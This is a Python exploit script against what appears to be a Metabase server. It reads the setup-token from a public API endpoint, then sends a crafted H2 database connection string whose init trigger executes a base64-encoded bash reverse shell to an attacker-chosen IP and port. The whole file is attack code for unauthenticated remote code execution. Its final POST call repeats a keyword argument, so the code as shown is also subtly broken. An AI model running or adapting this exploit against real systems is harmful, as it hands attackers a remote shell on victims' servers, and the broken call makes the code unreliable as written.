import argparse
from urllib.parse import urljoin
import requests
import regex
import logging
import base64
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
}


def get_token(target: str):
    url = urljoin(target, "/api/session/properties")
    # print(url)
    response = requests.get(url=url, allow_redirects=False, headers=headers)
    assert response.status_code == 200
    # print(response.text)
    matchobj = regex.findall(r"\"setup-token\":\"(.*?)\"", response.text)
    # print(matchobj)
    token = matchobj[0]
    logging.info("Setup-token:%s", token)
    return token


def exploit(target: str, token: str, listen_ip: str, listen_port: str):
    url = urljoin(target, "/api/setup/validate")
    payload = base64.b64encode(f"bash -i >& /dev/tcp/{listen_ip}/{listen_port} 0>&1".encode()).decode()
    data = {
        "token": token,
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
                "advanced-options": False,
                "ssl": True,
                "init": f"CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\u000A$$"
            },
            "name": "an-sec-research-team",
            "engine": "h2"
        }
    }
    print(data)
    headers = {'Content-type': 'application/json'}
    response = requests.post(url=url, json=data, headers=headers, verify=False, headers=headers)
    # time.sleep(5)
    # logging.info("Connecting to:%s", listen_ip)


def main(target: str, listen_ip: str, listen_port: str):
    token = get_token(target)
    exploit(target, token, listen_ip, listen_port)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, required=True, help="example: http://127.0.0.1:3000")
    parser.add_argument('-i', '--listen_ip', type=str, required=True)
    parser.add_argument('-p', '--listen_port', type=str, required=True)
    args = parser.parse_args()
    # print(args)
    main(args.url, args.listen_ip, args.listen_port)